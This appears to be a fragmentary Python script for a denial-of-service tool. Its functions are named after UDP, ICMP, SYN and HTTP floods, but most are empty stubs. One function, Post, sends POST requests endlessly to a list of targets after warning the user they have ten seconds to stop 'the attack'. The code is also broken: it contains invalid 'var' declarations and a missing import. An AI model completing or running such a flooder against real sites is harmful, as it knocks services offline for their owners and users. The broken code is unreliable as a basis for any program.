import requests as res

var vector
var bye

def udp_flooding(i):
    print("first choice")

def ICMP(i):
    pass

def Syn_flood(i):
    pass

def pof(i):
    pass

def Post(i):
    print("using post method to: ", vector)
    print("u have 10 second to end the attack, press ctrl+c or ctrl+z")
    time.sleep(10)
    while True:
        for target in vector:
            response = res.post(target, data=bye, json=None)
            print(response.text)

def Get(i):
    pass
